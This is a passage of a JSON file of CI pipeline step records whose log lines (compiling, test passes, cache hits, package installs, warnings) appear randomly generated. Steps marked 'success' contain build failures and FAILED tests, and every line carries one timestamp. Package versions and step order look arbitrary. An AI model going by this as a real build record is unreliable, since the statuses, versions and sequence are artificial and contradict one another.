          "Compiling src/app.ts...",
          "\u2713 build completed",
          "  PASS: test_api_health (468ms)",
          "[12:00:17] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Cache hit for key-5999",
          "Compiling src/utils.go...",
          "\u2713 lint completed",
          "\u2713 build completed",
          "[12:00:17] INFO: Processing request",
          "\u2713 lint completed",
          "[12:00:17] INFO: Processing request",
          "Step 5/10: Building",
          "\u2717 build failed with exit code 21",
          "Step 6/10: Building",
          "Installing webpack@3.15.0",
          "WARNING: prettier has known vulnerabilities",
          "Step 6/10: Building",
          "Step 4/10: Building",
          "  PASS: test_auth_login (455ms)",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "[12:00:17] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (19MB)",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "Compiling src/service.java...",
          "  PASS: test_user_create (498ms)",
          "Cache hit for key-7864",
          "[12:00:17] INFO: Processing request",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-04T12:00:23.841012",
        "finished_at": "2025-12-04T12:00:34.123989",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "\u2713 build completed",
          "  PASS: test_auth_login (385ms)",
          "[12:00:17] INFO: Processing request",
          "  PASS: test_db_connect (486ms)",
          "\u2713 lint completed",
          "\u2717 build failed with exit code 66",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "WARNING: jest has known vulnerabilities",
          "  PASS: test_auth_login (364ms)",
          "Step 5/10: Building",
          "Step 3/10: Building",
          "Installing axios@2.18.0",
          "  PASS: test_db_connect (244ms)",
          "  PASS: test_api_health (83ms)",
          "[12:00:17] INFO: Processing request",
          "Step 9/10: Building",
          "Cache hit for key-2321",
          "  PASS: test_api_health (411ms)",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Step 10/10: Building",
          "[12:00:17] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (5MB)",
          "\u2713 test completed",
          "WARNING: jest has known vulnerabilities",
          "WARNING: jest has known vulnerabilities",
          "  PASS: test_db_connect (149ms)",
          "Cache hit for key-8806",
          "Cache hit for key-1682",
          "  PASS: test_auth_login (189ms)",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Cache hit for key-5340",
          "Installing jest@5.5.0",
          "Cache hit for key-2638",
          "  PASS: test_auth_login (403ms)",
          "Installing react@5.0.0",
          "Step 3/10: Building",
          "[12:00:17] ERROR: Connection failed",
          "\u2713 build completed",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (5MB)",
          "\u2717 build failed with exit code 21",
          "Cache hit for key-4530",
          "  PASS: test_cache_hit (245ms)",
          "Artifact uploaded: build.tar.gz (47MB)",
          "\u2713 lint completed",
          "[12:00:17] INFO: Processing request",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (27MB)",
          "\u2713 lint completed",
          "Step 2/10: Building",
          "Cache hit for key-9324",
          "Installing eslint@3.11.0",
          "  PASS: test_user_create (187ms)",
          "\u2713 test completed",
          "WARNING: lodash has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing axios@2.4.0",
          "Installing jest@2.7.0",
          "  PASS: test_user_create (236ms)",
          "Installing axios@2.16.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-2089",
          "  PASS: test_db_connect (47ms)",
          "  PASS: test_auth_login (139ms)",
          "Compiling src/service.java...",
          "  PASS: test_cache_hit (144ms)",
          "Step 5/10: Building",
          "  PASS: test_db_connect (215ms)",
          "\u2713 build completed",
          "\u2713 build completed",
          "Cache hit for key-1787",
          "[12:00:17] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (40MB)",
          "[12:00:17] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "[12:00:17] INFO: Processing request",
          "\u2713 lint completed",
          "Cache hit for key-6203",
          "  PASS: test_auth_login (312ms)",
          "Compiling src/utils.go...",
          "  PASS: test_auth_login (283ms)",
          "[12:00:17] INFO: Processing request",
          "Exception: NullPointerException",
          "Artifact uploaded: build.tar.gz (18MB)",
          "[12:00:17] INFO: Processing request",
          "\u2717 build failed with exit code 118",
          "  PASS: test_user_create (315ms)",
          "Cache hit for key-3064",
          "Cache hit for key-2031",
          "[12:00:17] INFO: Processing request",
          "\u2717 build failed with exit code 108",
          "[12:00:17] WARN: Deprecated API usage",
          "Cache hit for key-9890",
          "Compiling src/app.ts...",
          "[12:00:17] INFO: Processing request",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (36MB)",
          "  PASS: test_auth_login (21ms)",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Installing eslint@5.16.0",
          "Step 8/10: Building",
          "[12:00:17] INFO: Processing request",
          "Cache hit for key-8814",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Exception: NullPointerException",
          "Cache hit for key-6229",
          "  PASS: test_user_create (70ms)",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Installing react@5.4.0",
          "\u2713 build completed",
          "[12:00:17] WARN: Deprecated API usage",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (44MB)",
          "\u2713 lint completed",
          "[12:00:17] INFO: Processing request",
          "[12:00:17] INFO: Processing request",
          "[12:00:17] INFO: Processing request",
          "Installing jest@2.9.0",
          "Installing axios@5.10.0",
          "Compiling src/utils.go...",
          "  PASS: test_db_connect (88ms)",
          "Installing lodash@2.19.0",
          "Compiling src/main.py...",
          "Step 9/10: Building",
          "[12:00:17] INFO: Processing request",
          "\u2713 lint completed",
          "Installing axios@3.14.0",
          "[12:00:17] INFO: Processing request",
          "Step 7/10: Building",
          "\u2713 lint completed",
          "WARNING: webpack has known vulnerabilities",
          "  PASS: test_db_connect (175ms)",
          "[12:00:17] WARN: Deprecated API usage",
          "Exception: NullPointerException",
          "Compiling src/service.java...",
          "WARNING: prettier has known vulnerabilities",
          "Step 2/10: Building",
          "[12:00:17] INFO: Processing request",
          "\u2713 lint completed",
          "Step 4/10: Building",
          "Step 4/10: Building",
          "Cache hit for key-6094",
          "WARNING: webpack has known vulnerabilities",
          "Step 9/10: Building",
          "Compiling src/utils.go...",
          "Step 4/10: Building",
          "Cache hit for key-8926",
          "Cache hit for key-5701",
          "Step 5/10: Building",
          "\u2713 lint completed",
          "\u2713 test completed",
          "WARNING: jest has known vulnerabilities",
          "\u2713 build completed",
          "[12:00:17] INFO: Processing request",
          "Cache hit for key-2661",
          "WARNING: prettier has known vulnerabilities",
          "[12:00:17] INFO: Processing request",
          "Installing react@2.11.0",
          "Step 10/10: Building",
          "Installing express@3.6.0",
          "Step 7/10: Building",
          "Compiling src/main.py...",
          "  PASS: test_api_health (476ms)",
          "  PASS: test_auth_login (206ms)",
          "[12:00:17] INFO: Processing request",
          "Cache hit for key-6615",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-04T12:00:34.123989",
        "finished_at": "2025-12-04T12:00:44.406966",
        "log_lines": [
          "=== Step: type_check ===",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Cache hit for key-1425",
          "  PASS: test_db_connect (72ms)",
          "[12:00:17] WARN: Deprecated API usage",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "Installing lodash@1.15.0",
          "\u2713 test completed",
          "[12:00:17] INFO: Processing request",
          "Cache hit for key-2439",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:17] ERROR: Connection failed",
          "\u2713 build completed",
          "Installing react@1.14.0",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "  PASS: test_user_create (412ms)",
          "[12:00:17] INFO: Processing request",
          "Cache hit for key-9414",
          "Step 4/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Installing prettier@1.19.0",
          "Cache hit for key-1058",
          "\u2713 test completed",
          "Cache hit for key-5542",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Cache hit for key-1739",
          "  PASS: test_cache_hit (312ms)",
          "\u2713 build completed",
          "[12:00:17] WARN: Deprecated API usage",
          "Compiling src/handler.rs...",
          "  PASS: test_api_health (255ms)",
          "Installing react@1.4.0",
          "\u2713 lint completed",
          "  PASS: test_api_health (230ms)",
          "Step 7/10: Building",
          "Cache hit for key-5415",
          "\u2713 lint completed",
          "  PASS: test_auth_login (140ms)",
          "  PASS: test_cache_hit (401ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 lint completed",
          "Cache hit for key-8639",
          "[12:00:17] INFO: Processing request",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Installing express@5.14.0",
          "[12:00:17] WARN: Deprecated API usage",
          "Cache hit for key-1983",
          "Compiling src/handler.rs...",
          "Compiling src/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/utils.go...",
          "Cache hit for key-1607",
          "\u2713 lint completed",
          "Compiling src/index.js...",
          "Cache hit for key-6616",
          "Step 7/10: Building",
          "Cache hit for key-5944",
          "Installing webpack@2.12.0",
          "Compiling src/utils.go...",
          "[12:00:17] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Step 7/10: Building",
          "Cache hit for key-8220",
          "[12:00:17] INFO: Processing request",
          "[12:00:17] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (38MB)",
          "[12:00:17] INFO: Processing request",
          "Step 9/10: Building",
          "WARNING: react has known vulnerabilities",
          "  PASS: test_api_health (315ms)",
          "Compiling src/index.js...",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (16MB)",
          "  PASS: test_db_connect (7ms)",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (39MB)",
          "[12:00:17] INFO: Processing request",
          "  PASS: test_user_create (242ms)",
          "Installing lodash@5.18.0",
          "  PASS: test_api_health (145ms)",
          "Compiling src/index.js...",
          "Step 8/10: Building",
          "Step 10/10: Building",
          "\u2713 test completed",
          "Step 2/10: Building",
          "[12:00:17] INFO: Processing request",
          "Step 1/10: Building",
          "\u2713 test completed",
          "\u2713 build completed",
          "Compiling src/index.js...",
          "[12:00:17] ERROR: Connection failed",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Installing express@1.12.0",
          "Installing prettier@1.0.0",
          "WARNING: express has known vulnerabilities",
          "[12:00:17] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Step 3/10: Building",
          "Compiling src/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 9/10: Building",
          "\u2713 lint completed",
          "[12:00:17] WARN: Deprecated API usage",
          "Installing lodash@2.16.0",
          "[12:00:17] INFO: Processing request",
          "Installing webpack@1.12.0",
          "  PASS: test_cache_hit (410ms)",
          "Step 1/10: Building",
          "\u2713 lint completed",
          "Step 9/10: Building",
          "Cache hit for key-3042",
          "\u2717 build failed with exit code 73",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Cache hit for key-9881",
          "Installing react@3.9.0",
          "  PASS: test_user_create (453ms)",
          "  PASS: test_cache_hit (38ms)",
          "Installing eslint@2.9.0",
          "Cache hit for key-9132",
          "Step 2/10: Building",
          "Cache hit for key-8437",
          "[12:00:17] INFO: Processing request",
          "Cache hit for key-4253",
          "[12:00:17] INFO: Processing request",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Compiling src/utils.go...",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "Cache hit for key-6555",
          "Compiling src/handler.rs...",
          "Step 6/10: Building",
          "[12:00:17] INFO: Processing request",
          "\u2713 build completed",
          "Cache hit for key-2855",
          "  PASS: test_auth_login (86ms)",
          "\u2713 build completed",
          "Installing express@5.7.0",
          "Cache hit for key-7792",
          "  PASS: test_api_health (284ms)",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "[12:00:17] INFO: Processing request",
          "Step 1/10: Building",
          "  PASS: test_api_health (129ms)",
          "Cache hit for key-6297",
          "  PASS: test_db_connect (21ms)",
          "  PASS: test_db_connect (342ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "Compiling src/utils.go...",
          "Cache hit for key-6035",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (18MB)",
          "  PASS: test_db_connect (493ms)",
          "Step 3/10: Building",
          "[12:00:17] INFO: Processing request",
          "Step 5/10: Building",
          "  PASS: test_db_connect (94ms)",
          "[12:00:17] INFO: Processing request",
          "\u2713 test completed",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-04T12:00:44.406966",
        "finished_at": "2025-12-04T12:01:15.255897",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Step 6/10: Building",
          "\u2713 build completed",
          "Compiling src/utils.go...",
          "[12:00:17] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (46MB)",
          "  PASS: test_cache_hit (331ms)",
          "  PASS: test_db_connect (417ms)",
          "Step 3/10: Building",
          "Cache hit for key-1297",
          "\u2713 build completed",
          "Step 6/10: Building",
          "Installing express@5.14.0",
          "[12:00:17] INFO: Processing request",
          "Cache hit for key-7324",
          "Cache hit for key-5994",
          "Step 3/10: Building",
          "Compiling src/main.py...",
          "Cache hit for key-8059",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Step 7/10: Building",
          "  PASS: test_user_create (414ms)",
          "Artifact uploaded: build.tar.gz (47MB)",
          "\u2713 lint completed",
          "Compiling src/index.js...",
          "[12:00:17] INFO: Processing request",
          "Cache hit for key-7952",
          "Compiling src/handler.rs...",
          "[12:00:17] WARN: Deprecated API usage",
          "WARNING: webpack has known vulnerabilities",
          "Installing express@2.16.0",
          "\u2713 test completed",
          "Step 9/10: Building",
          "  PASS: test_user_create (232ms)",
          "Installing express@2.12.0",
          "[12:00:17] INFO: Processing request",
          "Cache hit for key-6290",
          "Step 7/10: Building",
          "  PASS: test_db_connect (257ms)",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (37MB)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Cache hit for key-8785",
          "Installing jest@1.16.0",
          "  PASS: test_user_create (359ms)",
          "  PASS: test_api_health (13ms)",
          "Artifact uploaded: build.tar.gz (14MB)",
          "[12:00:17] INFO: Processing request",
          "Exception: ValueError",
          "[12:00:17] INFO: Processing request",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (18MB)",
          "WARNING: jest has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-1010",
          "Compiling src/utils.go...",
          "Installing webpack@2.19.0",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Cache hit for key-9079",
          "Installing jest@4.15.0",
          "Compiling src/index.js...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing express@2.10.0",
          "Compiling src/service.java...",
          "\u2717 build failed with exit code 74",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Cache hit for key-8128",
          "Installing react@2.1.0",
          "Cache hit for key-7981",
          "[12:00:17] INFO: Processing request",
          "Compiling src/app.ts...",
          "Compiling src/utils.go...",
          "Compiling src/handler.rs...",
          "[12:00:17] INFO: Processing request",
          "Installing axios@3.11.0",
          "Cache hit for key-1034",
          "\u2713 build completed",
          "[12:00:17] INFO: Processing request",
          "Cache hit for key-1053",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Cache hit for key-5924",
          "[12:00:17] ERROR: Connection failed",
          "[12:00:17] WARN: Deprecated API usage",
          "Step 5/10: Building",
          "Cache hit for key-4135",
          "Cache hit for key-2078",
          "Cache hit for key-5176",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_auth_login (85ms)",
          "  PASS: test_user_create (275ms)",
          "[12:00:17] INFO: Processing request",
          "Step 9/10: Building",
          "WARNING: prettier has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Cache hit for key-7218",
          "  PASS: test_user_create (177ms)",
          "\u2713 build completed",
          "  PASS: test_cache_hit (478ms)",
          "Installing react@4.16.0",
          "  PASS: test_api_health (9ms)",
          "Step 10/10: Building",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "Compiling src/app.ts...",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Cache hit for key-7564",
          "[12:00:17] INFO: Processing request",
          "Step 3/10: Building",
          "Installing webpack@4.11.0",
          "[12:00:17] INFO: Processing request",
          "Installing eslint@5.4.0",
          "Installing jest@3.19.0",
          "Exception: NullPointerException",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:00:17] ERROR: Connection failed",
          "  PASS: test_api_health (448ms)",
          "  PASS: test_api_health (226ms)",
          "[12:00:17] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Artifact uploaded: build.tar.gz (28MB)",
          "  PASS: test_db_connect (426ms)",
          "  PASS: test_auth_login (3ms)",
          "Cache hit for key-2216",
          "  PASS: test_cache_hit (177ms)",
          "Installing eslint@1.16.0",
          "[12:00:17] INFO: Processing request",
          "Step 1/10: Building",
          "Compiling src/handler.rs...",
          "Compiling src/handler.rs...",
          "Compiling src/index.js...",
          "[12:00:17] INFO: Processing request",
          "Cache hit for key-7828",
          "[12:00:17] INFO: Processing request",
          "Step 9/10: Building",
          "[12:00:17] WARN: Deprecated API usage",
          "Step 5/10: Building",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Compiling src/handler.rs...",
          "Cache hit for key-5713",
          "Step 9/10: Building",
          "Cache hit for key-4883",
          "Installing prettier@4.4.0",
          "\u2713 build completed",
          "\u2713 build completed",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-3690",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Cache hit for key-9728",
          "[12:00:17] INFO: Processing request",
          "Cache hit for key-7637",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Installing webpack@4.16.0",
          "[12:00:17] INFO: Processing request",
          "Compiling src/handler.rs...",
          "  PASS: test_cache_hit (100ms)",
          "Step 5/10: Building",
          "Installing webpack@1.9.0",
          "Cache hit for key-6707",
          "  PASS: test_user_create (290ms)",
          "\u2713 build completed",
          "[12:00:17] WARN: Deprecated API usage",
          "Cache hit for key-3216",
          "Installing react@5.2.0",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-04T12:01:15.255897",
        "finished_at": "2025-12-04T12:01:46.104828",
        "log_lines": [
          "=== Step: build ===",
          "[12:00:17] INFO: Processing request",
          "Installing lodash@2.15.0",
          "Artifact uploaded: build.tar.gz (1MB)",
          "  PASS: test_api_health (340ms)",
          "Installing axios@2.6.0",
          "Cache hit for key-7215",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (22MB)",
          "\u2713 build completed",
          "  PASS: test_db_connect (171ms)",
          "[12:00:17] WARN: Deprecated API usage",
          "Cache hit for key-5921",
          "  PASS: test_user_create (381ms)",
          "Step 4/10: Building",
          "Installing webpack@1.16.0",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Cache hit for key-8830",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (15MB)",
          "  PASS: test_cache_hit (244ms)",
          "Step 5/10: Building",
          "  PASS: test_api_health (43ms)",
          "Step 3/10: Building",
          "[12:00:17] INFO: Processing request",
          "Cache hit for key-5685",
          "Artifact uploaded: build.tar.gz (49MB)",
          "  PASS: test_db_connect (35ms)",
          "FAILED: test_user_create",
          "Installing prettier@4.19.0",
          "\u2713 lint completed",
          "Installing jest@5.8.0",
          "\u2713 build completed",
          "  PASS: test_api_health (48ms)",
          "Cache hit for key-4637",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Cache hit for key-6823",
          "  PASS: test_db_connect (454ms)",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Cache hit for key-2155",
          "\u2717 build failed with exit code 51",
          "[12:00:17] INFO: Processing request",
          "  PASS: test_cache_hit (178ms)",
          "  PASS: test_auth_login (382ms)",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "  PASS: test_user_create (148ms)",
          "Step 8/10: Building",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (7MB)",
          "[12:00:17] INFO: Processing request",
          "[12:00:17] INFO: Processing request",
          "Compiling src/app.ts...",
          "Cache hit for key-3209",
          "WARNING: webpack has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (49MB)",
          "[12:00:17] INFO: Processing request",
          "Installing react@4.2.0",
          "Step 2/10: Building",
          "  PASS: test_db_connect (496ms)",
          "\u2713 lint completed",
          "Exception: NullPointerException",
          "Cache hit for key-3054",
          "Compiling src/handler.rs...",
          "[12:00:17] INFO: Processing request",
          "Step 6/10: Building",
          "Step 5/10: Building",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (14MB)",
          "  PASS: test_auth_login (9ms)",
          "[12:00:17] INFO: Processing request",
          "Installing express@1.16.0",
          "Compiling src/main.py...",
          "  PASS: test_cache_hit (364ms)",
          "Installing react@5.12.0",
          "Installing react@5.3.0",
          "Step 7/10: Building",
          "Step 3/10: Building",
          "  PASS: test_auth_login (40ms)",
          "Cache hit for key-7392",
          "[12:00:17] INFO: Processing request",
          "[12:00:17] INFO: Processing request",
          "[12:00:17] INFO: Processing request",
          "Installing react@2.18.0",
          "[12:00:17] WARN: Deprecated API usage",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:17] INFO: Processing request",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "[12:00:17] ERROR: Connection failed",
          "Cache hit for key-6507",
          "Compiling src/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-2445",
          "  PASS: test_cache_hit (310ms)",
          "[12:00:17] INFO: Processing request",
          "[12:00:17] INFO: Processing request",
          "Installing express@2.13.0",
          "[12:00:17] WARN: Deprecated API usage",
          "Cache hit for key-4161",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Step 7/10: Building",
          "Compiling src/handler.rs...",
          "[12:00:17] INFO: Processing request",
          "\u2713 test completed",
          "FAILED: test_cache_hit",
          "Compiling src/service.java...",
          "Step 3/10: Building",
          "  PASS: test_api_health (147ms)",
          "Cache hit for key-4114",
          "[12:00:17] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Cache hit for key-5503",
          "\u2713 lint completed",
          "Cache hit for key-7689",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Artifact uploaded: build.tar.gz (34MB)",
          "[12:00:17] WARN: Deprecated API usage",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: test_user_create (447ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Cache hit for key-4889",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Cache hit for key-4787",
          "Step 5/10: Building",
          "  PASS: test_user_create (331ms)",
          "[12:00:17] WARN: Deprecated API usage",
          "\u2713 build completed",
          "\u2713 build completed",
          "[12:00:17] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 build completed",
          "Step 1/10: Building",
          "Step 10/10: Building",
          "  PASS: test_api_health (400ms)",
          "  PASS: test_api_health (490ms)",
          "\u2713 test completed",
          "[12:00:17] INFO: Processing request",
          "Cache hit for key-1246",
          "Installing eslint@1.16.0",
          "WARNING: lodash has known vulnerabilities",
          "Step 1/10: Building",
          "Step 6/10: Building",
          "Compiling src/main.py...",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (50MB)",
          "[12:00:17] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Compiling src/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:17] INFO: Processing request",
          "[12:00:17] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Cache hit for key-5675",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 test completed",
          "Step 9/10: Building",
          "[12:00:17] WARN: Deprecated API usage",
          "[12:00:17] INFO: Processing request",
          "Compiling src/handler.rs...",
          "[12:00:17] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (14MB)",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-04T12:01:46.104828",
        "finished_at": "2025-12-04T12:01:56.387805",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Cache hit for key-2105",
          "Cache hit for key-4037",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (36MB)",
          "\u2713 test completed",
          "Cache hit for key-2414",
          "Compiling src/app.ts...",
          "Cache hit for key-4759",
          "Step 7/10: Building",
          "[12:00:17] INFO: Processing request",
          "Cache hit for key-3282",
          "[12:00:17] INFO: Processing request",
          "Cache hit for key-1363",
          "FAILED: test_cache_hit",
          "[12:00:17] INFO: Processing request",
          "Cache hit for key-7277",
          "Installing lodash@3.6.0",
          "[12:00:17] INFO: Processing request",
          "Compiling src/index.js...",
          "Step 1/10: Building",
          "Cache hit for key-7426",
          "Artifact uploaded: build.tar.gz (14MB)",
          "\u2713 test completed",
          "[12:00:17] INFO: Processing request",
          "Compiling src/service.java...",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (41MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 test completed",
          "\u2713 lint completed",
          "Compiling src/main.py...",
          "Installing express@3.14.0",
          "Compiling src/handler.rs...",
          "  PASS: test_db_connect (20ms)",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Step 10/10: Building",
          "Cache hit for key-6311",
          "Installing axios@3.0.0",
          "  PASS: test_cache_hit (446ms)",
          "[12:00:17] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (36MB)",
          "  PASS: test_user_create (139ms)",
          "Cache hit for key-7517",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Installing jest@1.5.0",
          "Compiling src/utils.go...",
          "Installing axios@2.10.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing prettier@5.18.0",
          "Cache hit for key-1244",
          "[12:00:17] INFO: Processing request",
          "Step 3/10: Building",
          "[12:00:17] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (48MB)",
          "[12:00:17] INFO: Processing request",
          "Cache hit for key-2970",
          "Step 2/10: Building",
          "Cache hit for key-1018",
          "Installing lodash@3.4.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/service.java...",
          "[12:00:17] INFO: Processing request",
          "[12:00:17] ERROR: Connection failed",
          "Step 4/10: Building",
          "Step 6/10: Building",
          "  PASS: test_cache_hit (108ms)",
          "Artifact uploaded: build.tar.gz (20MB)",
          "[12:00:17] INFO: Processing request",
          "Cache hit for key-7442",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Compiling src/utils.go...",
          "  PASS: test_cache_hit (172ms)",
          "WARNING: webpack has known vulnerabilities",
          "[12:00:17] INFO: Processing request",
          "\u2713 test completed",
          "  PASS: test_api_health (341ms)",
          "FAILED: test_auth_login",
          "Artifact uploaded: build.tar.gz (38MB)",
          "  PASS: test_cache_hit (190ms)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (43MB)",
          "[12:00:17] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (27MB)",
          "\u2713 build completed",
          "Step 1/10: Building",
          "Installing webpack@5.8.0",
          "Step 2/10: Building",
          "Step 6/10: Building",
          "Installing eslint@4.13.0",
          "  PASS: test_auth_login (464ms)",
          "Installing axios@5.7.0",
          "[12:00:17] INFO: Processing request",
          "[12:00:17] INFO: Processing request",
          "Cache hit for key-2359",
          "  PASS: test_db_connect (330ms)",
          "[12:00:17] INFO: Processing request",
          "Step 7/10: Building",
          "Installing lodash@5.16.0",
          "  PASS: test_db_connect (185ms)",
          "[12:00:17] INFO: Processing request",
          "[12:00:17] INFO: Processing request",
          "Step 4/10: Building",
          "\u2713 lint completed",
          "\u2713 test completed",
          "[12:00:17] INFO: Processing request",
          "\u2713 test completed",
          "Installing lodash@2.16.0",
          "\u2713 build completed",
          "\u2713 test completed",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "Step 10/10: Building",
          "WARNING: react has known vulnerabilities",
          "Compiling src/handler.rs...",
          "[12:00:17] INFO: Processing request",
          "  PASS: test_cache_hit (73ms)",
          "\u2717 build failed with exit code 46",
          "Installing express@2.1.0",
          "\u2713 build completed",
          "Step 2/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_auth_login (414ms)",
          "[12:00:17] WARN: Deprecated API usage",
          "Compiling src/handler.rs...",
